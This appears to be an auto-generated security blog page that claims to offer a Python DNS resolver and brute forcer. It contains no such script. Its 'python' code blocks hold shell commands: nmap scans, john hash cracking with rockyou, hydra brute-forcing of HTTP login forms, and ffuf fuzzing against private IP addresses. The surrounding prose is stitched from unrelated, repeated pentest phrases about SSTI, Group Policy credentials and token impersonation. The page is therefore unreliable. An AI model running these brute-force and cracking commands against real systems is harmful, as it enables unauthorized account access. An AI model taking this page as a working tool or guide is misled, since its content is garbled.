---
TitleSEO: "DNS Resolver and Brute Forcer in Python | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Python"
Author: "ZureFX"
Description: "A Python script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "parser, bash, c, python"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-226.html"
URL_IMAGES: ""
Date: "2024-12-21"
Tags: "Parser, Bash, C, Python"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-226"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-226.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `kerbrute`
- `dcomexec`
- `dcomexec`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
nmap -sCV -p5986,23,3389 10.109.45.238 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.70.220 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.208.7/FUZZ
```

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
nmap -sCV -p3389,445,9200 10.17.99.99 -oN scan.txt
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p27017,139,995 10.64.140.24 -oN scan.txt
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.31.71.40 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.126.250 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 21.08s
```
